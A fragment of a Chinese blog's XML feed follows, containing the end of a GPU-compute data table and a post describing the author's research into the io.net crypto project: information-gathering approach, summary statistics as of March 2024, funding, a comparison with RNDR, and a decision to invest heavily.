<td style="text-align:left">1917000</td>
<td style="text-align:left">0</td>
<td style="text-align:left">0%</td>
</tr>
</tbody>
</table>
<h2 id="汇总数据">汇总数据:</h2>
<table>
<thead>
<tr>
<th style="text-align:left">算力总价值（rmb）</th>
<th style="text-align:left">5亿6872万</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">已租赁总价值（rmb）</td>
<td style="text-align:left">9414万</td>
</tr>
<tr>
<td style="text-align:left">已租赁比例</td>
<td style="text-align:left">17%</td>
</tr>
<tr>
<td style="text-align:left">GPU总量</td>
<td style="text-align:left">30421</td>
</tr>
<tr>
<td style="text-align:left">数据采集截止时间</td>
<td style="text-align:left">2024年3月15日</td>
</tr>
</tbody>
</table>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://boost-tool.com/zh/tools/md_table">从一个表格中生成Markdown</a></p>
</li>
<li class="lvl-2">
<p><a href="https://cloud.io.net/explorer/home">https://cloud.io.net/explorer/home</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-初识Ionet</title>
    <url>/2024/41871.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>大约在20240310左右接触到<code>ionet</code>，原团队决定参与。</p>
<h1>快速了解项目:</h1>
<p>带着一种遍历的思路，通过类似主题阅读的方式，把在Internet上能搜索到的信息都看一遍。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240505224937.png" alt="20240505224937" /><br />
通过各方不同的视角去快速的了解一个项目。常见的视角有:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>项目方视角</p>
</li>
<li class="lvl-2">
<p>投资人视角</p>
</li>
<li class="lvl-2">
<p>KOL视角</p>
</li>
<li class="lvl-2">
<p>技术视角</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240506022910.png" alt="20240506022910" /><br />
通过关键词：<code>io.net</code>、<code>ionet</code>,在常见的网站,例如</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>官方网站</p>
</li>
<li class="lvl-2">
<p>YouTube</p>
</li>
<li class="lvl-2">
<p>Twitter</p>
</li>
<li class="lvl-2">
<p>Google</p>
</li>
<li class="lvl-2">
<p>区块链媒体(blockbeat律动、深潮等)</p>
</li>
<li class="lvl-2">
<p>各类研报</p>
</li>
</ul>
<p>去遍历搜索，把能搜刮到的文章、视频都快速过一遍。<br />
这里面需要注意的关键词有:一手二手信息源、时效性、专业度、官方非官方等。</p>
<p>遍历完已有的咨询后，把一些认为比较写得/讲得较好的文章，再反刍一下，加深理解，这个时候对ionet项目全貌就能有个概览。</p>
<blockquote>
<p>初步看下来，ionet这个项目的基本分挺高的，叙事概念(AI+Depin+Solana)的热度很高。</p>
<p>此时，就需要带着批判思维，不断提出问题并 亲自去验证。</p>
</blockquote>
<h2 id="数据分析">数据分析:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240505230514.png" alt="20240505230514" /><br />
当时看完深潮对项目方的多个采访稿后，觉得ionet确实是个好项目,越看越充值了信仰。<br />
这个时候又产生了新的质疑:</p>
<blockquote>
<p>这些可信吗? 屁股歪吗? 能否从数据分析的角度再了解一下?</p>
</blockquote>
<p>详细数据分析表格可参考: <a href="https://jerrychan807.github.io/2024/20872.html">Crypto-20240315_ionet_GPU算力数据分析</a></p>
<p>截止20240315，<code>ionet</code>已采集约5亿rmb的算力。<br />
第一阶段积分奖励计划<code>Ignition</code>的时间范围为:3.1~4.28,也就是过了四分之一的活动周期，就有上亿rmb等值gpu算力转发到ionet的集群中去，换言之，就是有很多热钱涌过去。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240506024205.png" alt="20240506024205" /></p>
<blockquote>
<p>把已收集到的信息，通过<code>$</code>这个单位进行格式化，再加工处理，输出一份简化研报。</p>
</blockquote>
<h1>ionet简化版研报:</h1>
<h2 id="叙事概念">叙事概念:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>AI 人工智能</p>
</li>
<li class="lvl-2">
<p>Depin 去中心化的物理基础设施网络</p>
</li>
<li class="lvl-2">
<p>Solana 高性能的公链</p>
</li>
</ul>
<h2 id="一句话介绍">一句话介绍:</h2>
<p>Gpu云算力租赁平台<br />
Io.net致力于通过其专为机器学习设计的去中心化GPU网络，革新云计算领域。</p>
<h2 id="融资情况">融资情况:</h2>
<p>A轮高达3000万美金</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240506023251.png" alt="20240506023251" /><br />
数据来源:<a href="https://www.coincarp.com/zh/fundraising/ionet-series-a/">https://www.coincarp.com/zh/fundraising/ionet-series-a/</a></p>
<h2 id="媒体相关报道">媒体相关报道:</h2>
<p>数据来源:深潮<br />
<a href="https://www.techflowpost.com/search/index_io.net.html">https://www.techflowpost.com/search/index_io.net.html</a></p>
<h2 id="数据分析-2">数据分析:</h2>
<table>
<thead>
<tr>
<th style="text-align:left">算力总价值（rmb）</th>
<th style="text-align:left">5亿6872万</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">已租赁总价值（rmb）</td>
<td style="text-align:left">9414万</td>
</tr>
<tr>
<td style="text-align:left">已租赁比例</td>
<td style="text-align:left">17%</td>
</tr>
<tr>
<td style="text-align:left">GPU总量</td>
<td style="text-align:left">30421</td>
</tr>
<tr>
<td style="text-align:left">数据采集截止时间</td>
<td style="text-align:left">2024年3月15日</td>
</tr>
</tbody>
</table>
<h2 id="io-net与rndr对比图">io.net与rndr对比图:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20240506023739.png" alt="20240506023739" /></p>
<p>当时从官网的数据来看，ionet的未来估值会超过rndr，大致进入市值前30去。</p>
<h1>Summary:</h1>
<p>初步调研后，我们决定大仓位参与。</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
</search>
